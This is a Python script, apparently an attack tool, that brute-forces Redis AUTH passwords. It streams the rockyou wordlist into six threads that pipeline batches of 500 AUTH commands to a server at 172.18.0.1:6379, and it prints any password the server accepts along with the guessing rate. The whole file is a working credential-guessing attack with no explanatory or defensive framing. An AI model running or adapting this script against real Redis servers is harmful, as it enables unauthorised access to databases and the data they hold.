#!/usr/bin/env python3
"""Pipelined Redis AUTH brute from local rockyou.txt.gz"""
import socket, threading, queue, time, gzip

REDIS_HOST = "172.18.0.1"
REDIS_PORT = 6379
WORDLIST = "/tmp/rockyou.txt.gz"
BATCH = 500
FOUND = threading.Event()
RESULT = queue.Queue()
COUNTER = {"n": 0}
LOCK = threading.Lock()

def worker(wid, line_queue):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((REDIS_HOST, REDIS_PORT))
    except Exception as e:
        RESULT.put(f"W{wid}_CONN_FAIL:{e}")
        return
    batch = []
    while not FOUND.is_set():
        try:
            word = line_queue.get_nowait()
        except queue.Empty:
            break
        batch.append(word)
        if len(batch) >= BATCH:
            try:
                pwds = [w for w in batch if 0 < len(w) <= 200]
                payload = b"".join(b"AUTH " + w.encode('utf-8','ignore') + b"\r\n" for w in pwds)
                if not payload:
                    batch = []
                    continue
                s.sendall(payload)
                with LOCK:
                    COUNTER["n"] += len(pwds)
                buf = b""
                got = 0
                s.settimeout(20)
                while got < len(pwds):
                    chunk = s.recv(131072)
                    if not chunk:
                        break
                    buf += chunk
                    got = buf.count(b"\r\n")
                lines = buf.split(b"\r\n")
                for i, resp in enumerate(lines):
                    if resp.startswith(b"+OK"):
                        RESULT.put(f"FOUND:{pwds[i] if i < len(pwds) else '???'}")
                        FOUND.set()
                        s.close()
                        return
                batch = []
            except Exception as e:
                RESULT.put(f"W{wid}_ERR:{type(e).__name__}")
                try:
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((REDIS_HOST, REDIS_PORT))
                except:
                    return
                batch = []
    try:
        s.close()
    except:
        pass

def main():
    print("START", flush=True)
    line_queue = queue.Queue(maxsize=50000)

    def producer():
        try:
            with gzip.open(WORDLIST, 'rt', errors='ignore') as f:
                for line in f:
                    if FOUND.is_set():
                        break
                    line_queue.put(line.strip())
            print("PRODUCER_DONE", flush=True)
        except Exception as e:
            RESULT.put(f"PROD_ERR:{e}")

    pt = threading.Thread(target=producer, daemon=True)
    pt.start()

    threads = []
    for i in range(6):
        t = threading.Thread(target=worker, args=(i, line_queue), daemon=True)
        t.start()
        threads.append(t)

    start = time.time()
    last_report = start
    while not FOUND.is_set():
        try:
            r = RESULT.get(timeout=20)
            print(r, flush=True)
            if r.startswith("FOUND:"):
                break
        except queue.Empty:
            pass
        now = time.time()
        if now - last_report > 60:
            rate = COUNTER["n"] / (now - start)
            print(f"PROGRESS:{COUNTER['n']} tried, {rate:.0f}/s, q={line_queue.qsize()}", flush=True)
            last_report = now
        if not any(t.is_alive() for t in threads) and line_queue.empty():
            break

    while not RESULT.empty():
        print(RESULT.get(), flush=True)
    elapsed = time.time() - start
    print(f"DONE:{'FOUND' if FOUND.is_set() else 'NOT_FOUND'} in {elapsed:.0f}s, {COUNTER['n']} tried", flush=True)

main()
